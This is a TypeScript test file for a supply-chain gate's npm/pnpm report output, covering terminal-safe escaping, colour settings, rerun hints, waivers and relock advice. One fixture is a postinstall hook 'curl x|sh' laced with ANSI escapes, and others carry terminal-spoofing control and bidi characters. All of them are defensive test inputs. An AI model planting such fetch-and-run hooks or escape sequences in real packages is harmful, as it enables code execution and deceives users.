import { describe, expect, test } from 'bun:test';
import { Schema } from 'effect';
import { noContext, Waiver, type DecisionContext } from '../src/context';
import { Sha512Integrity, type PackageVersionEvidence } from '../src/evidence';
import { parseGap, type FetchGaps } from '../src/npm/evidence-directory';
import { humanReport, ruleMeanings } from '../src/npm/report';
import type { LockfileNode } from '../src/npm/lockfile';
import type { VerifyRecord } from '../src/npm/verify';
import { decide } from '../src/policy';
import { colorEnabled, inert, inertJson, plain } from '../src/terminal';
import { loadSupplyChainPolicyV2 } from './support/policies';
import { unsafe } from './support/unsafe';

const policy = loadSupplyChainPolicyV2();
const at = new Date('2026-06-01T00:00:00Z');
const integrity = Sha512Integrity.make(`sha512-${'A'.repeat(86)}==`);
const listed = (...gaps: string[]): FetchGaps => ({
  kind: 'listed',
  gaps: gaps.map(parseGap),
});

const clean: PackageVersionEvidence = {
  subject: { ecosystem: 'npm', name: 'lib', version: '1.2.0' },
  source: {
    kind: 'registry',
    registry: 'https://registry.npmjs.org',
    integrity,
  },
  publishTime: { kind: 'packument', at: new Date('2026-01-01T00:00:00Z') },
  provenance: { kind: 'absent' },
  earlierProvenance: 'none',
  publisher: { kind: 'continuous', identity: { kind: 'account', name: 'amy' } },
  installScripts: { kind: 'none' },
  integrityCheck: 'matched',
  feeds: { kind: 'checked', hits: [] },
  claims: [],
};

function report(
  evidence: Partial<PackageVersionEvidence>,
  options: {
    gaps?: FetchGaps;
    context?: DecisionContext;
    nodes?: readonly LockfileNode[];
    format?: 'package-lock' | 'pnpm-lock';
  } = {},
): string {
  const context = options.context ?? noContext;
  const full = { ...clean, ...evidence };
  const record: VerifyRecord = {
    kind: 'decision',
    path: `node_modules/${full.subject.name}`,
    dev: false,
    optional: false,
    at,
    ...decide({ evidence: full, now: at, context, canonical: policy }),
    evidence: full,
  };

  return humanReport({
    records: [record],
    nodes: options.nodes ?? [],
    policy,
    context,
    gaps: options.gaps ?? listed(),
    style: plain,
    format: options.format ?? 'package-lock',
  });
}

describe('inert', () => {
  test.each([
    ['plain name', 'plain name'],
    ['\u001b[31mred', '\\x1b[31mred'],
    ['a\r\nb', 'a\\r\\nb'],
    ['tab\there', 'tab\\there'],
    ['\u009b2J', '\\x9b2J'],
    ['\u007f', '\\x7f'],
    ['left\u202eright', 'left\\u202eright'],
    ['\u2066isolate\u2069', '\\u2066isolate\\u2069'],
    ['back\\slash', 'back\\\\slash'],
    ['café 日本', 'café 日本'],
    ['tag\u{e0041}1', 'tag\\u{e0041}1'],
  ])('%j prints as %j', (input, output) => {
    expect(inert(input)).toBe(output);
  });

  test('inertJson decodes to the same value and carries no control characters', () => {
    const value = {
      name: '\u001b]0;title\u0007\u009b\u202e',
      spec: 'git+https://x/\u{e0041}1#abc',
      n: 1,
    };
    const text = inertJson(value);

    expect(text).not.toMatch(unsafe);
    expect(JSON.parse(text)).toEqual(value);
  });
});

describe('colorEnabled', () => {
  test.each([
    [true, {}, true],
    [undefined, {}, false],
    [false, {}, false],
    [true, { NO_COLOR: '1' }, false],
    [true, { NO_COLOR: '' }, true],
    [true, { TERM: 'dumb' }, false],
    [undefined, { FORCE_COLOR: '1' }, true],
    [undefined, { FORCE_COLOR: '3', NO_COLOR: '1' }, true],
    [true, { FORCE_COLOR: '0' }, false],
    [true, { FORCE_COLOR: 'false' }, false],
    [undefined, { FORCE_COLOR: '' }, true],
    [undefined, { FORCE_COLOR: 'true' }, true],
    [true, { FORCE_COLOR: 'yes' }, false],
    [true, { FORCE_COLOR: '4' }, false],
  ] as const)('isTTY %p with %j is %p', (isTTY, env, expected) => {
    expect(colorEnabled({ isTTY, env })).toBe(expected);
  });
});

test('every SupplyChainPolicy/v2 rule has its own explanation', () => {
  expect(
    policy.rules.filter((rule) => !Object.hasOwn(ruleMeanings, rule.code)),
  ).toEqual([]);
});

test('an install script with escape sequences prints inert', () => {
  const text = report({
    installScripts: {
      kind: 'new',
      added: [
        { hook: 'postinstall', command: 'curl x|sh\u001b[2K\r\u001b[32mok' },
      ],
    },
  });

  expect(text).toContain('new_install_script');
  expect(text).not.toMatch(unsafe);
  expect(text).toContain('curl x|sh\\x1b[2K\\r\\x1b[32mok');
});

test('a waivable rule on a version without a known integrity prints no waiver', () => {
  const text = report({
    source: {
      kind: 'registry',
      registry: 'https://registry.npmjs.org',
      integrity: null,
    },
    integrityCheck: 'unchecked',
    publisher: {
      kind: 'changed',
      identity: { kind: 'account', name: 'mallory' },
      earlier: [{ kind: 'account', name: 'amy' }],
    },
  });

  expect(text).toContain('publisher_changed');
  expect(text).toContain('no waiver can be written');
  expect(text).not.toMatch(/waiver[^:\n]*: \{/);
});

describe('rerun', () => {
  const missing = {
    publishTime: { kind: 'unknown', reason: 'no packument recorded' },
  } as const;

  test('a failed fetch listed in SOURCES.json can be fixed by a rerun', () => {
    const text = report(missing, {
      gaps: listed(
        'packuments/lib.json: https://registry.npmjs.org/lib: HTTP 503 after 3 attempts',
      ),
    });

    expect(text).toContain(
      'rerun: can fix this, fetching packuments/lib.json failed (HTTP 503 after 3 attempts)',
    );
  });

  test('a 404 listed in SOURCES.json cannot', () => {
    const text = report(missing, {
      gaps: listed(
        'packuments/lib.json: https://registry.npmjs.org/lib: HTTP 404',
      ),
    });

    expect(text).toContain(
      "rerun: won't help, npm returned HTTP 404 for packuments/lib.json",
    );
  });

  test('evidence gate read and npm serves the same way cannot', () => {
    const text = report({
      provenance: {
        kind: 'unavailable',
        reason: 'expected one SLSA provenance bundle, found 0',
      },
    });

    expect(text).toContain(
      "rerun: won't help, SOURCES.json lists no failed fetch for this package",
    );
  });

  test('evidence missing from a recorded directory can be fetched', () => {
    const text = report(missing, { gaps: { kind: 'unlisted' } });

    expect(text).toContain(
      'rerun: can fix this, gate verify without --evidence fetches it',
    );
  });

  test('without a gap list, gate says when it cannot tell', () => {
    const text = report(
      {
        publisher: {
          kind: 'unknown',
          reason: 'an earlier publisher is unreadable',
        },
      },
      { gaps: { kind: 'unlisted' } },
    );

    expect(text).toContain("rerun: can't tell");
  });
});

test('feeds a fetch would cover can be fixed by a rerun, whatever the source', () => {
  const text = report({
    source: {
      kind: 'git',
      spec: `github:a/lib#${'a'.repeat(40)}`,
      integrity: null,
    },
    feeds: { kind: 'unavailable', reason: 'OSV snapshot does not cover lib' },
  });

  expect(text).toContain(
    'feed check unavailable: OSV snapshot does not cover lib\n    rerun: can fix this',
  );
});

test('an expired waiver in --context is named next to the new one', () => {
  const changed = {
    publisher: {
      kind: 'changed',
      identity: { kind: 'account', name: 'mallory' },
      earlier: [{ kind: 'account', name: 'amy' }],
    },
  } as const;
  const expiresAt = new Date('2026-05-01T00:00:00Z');
  const text = report(changed, {
    context: {
      allowedSources: [],
      waivers: [
        Schema.decodeUnknownSync(Waiver)({
          policy: policy.ref.id,
          package: 'lib',
          version: '1.2.0',
          integrity,
          rule: 'publisher_changed',
          reason: 'reviewed',
          author: 'amy',
          expiresAt: expiresAt.toISOString(),
        }),
      ],
    },
  });

  expect(text).toContain(
    `the waiver in --context expired at ${expiresAt.toISOString()}`,
  );
});

test('a pnpm-lock.yaml entry without integrity gets the pnpm relock step', () => {
  const text = report(
    {
      source: {
        kind: 'registry',
        registry: 'https://registry.npmjs.org',
        integrity: null,
      },
      integrityCheck: 'unchecked',
    },
    {
      format: 'pnpm-lock',
      nodes: [
        {
          kind: 'package',
          path: 'node_modules/lib',
          name: 'lib',
          version: '1.2.0',
          source: { kind: 'registry', integrity: null },
          dev: false,
          optional: false,
          hasInstallScript: null,
        },
      ],
    },
  );

  expect(text).toContain('pnpm install --lockfile-only');
  expect(text).not.toContain('package-lock');
});

test('unreadable entries point at the client that wrote the lockfile', () => {
  const unreadable = (format: 'package-lock' | 'pnpm-lock') =>
    humanReport({
      records: [{ kind: 'unreadable', path: 'x@1.0.0', error: 'broken' }],
      nodes: [],
      policy,
      context: noContext,
      gaps: listed(),
      style: plain,
      format,
    });

  expect(unreadable('package-lock')).toContain('regenerate them with npm');
  expect(unreadable('pnpm-lock')).toContain('regenerate them with pnpm');
});

test('a lockfile entry without integrity gets the relock step, not a waiver', () => {
  const text = report(
    {
      source: {
        kind: 'registry',
        registry: 'https://registry.npmjs.org',
        integrity: null,
      },
      integrityCheck: 'unchecked',
    },
    {
      nodes: [
        {
          kind: 'package',
          path: 'node_modules/lib',
          name: 'lib',
          version: '1.2.0',
          source: { kind: 'registry', integrity: null },
          dev: false,
          optional: false,
          hasInstallScript: false,
        },
      ],
    },
  );

  expect(text).toContain('- the lockfile entry has no sha512 integrity');
  expect(text).toContain('npm install --package-lock-only');
});
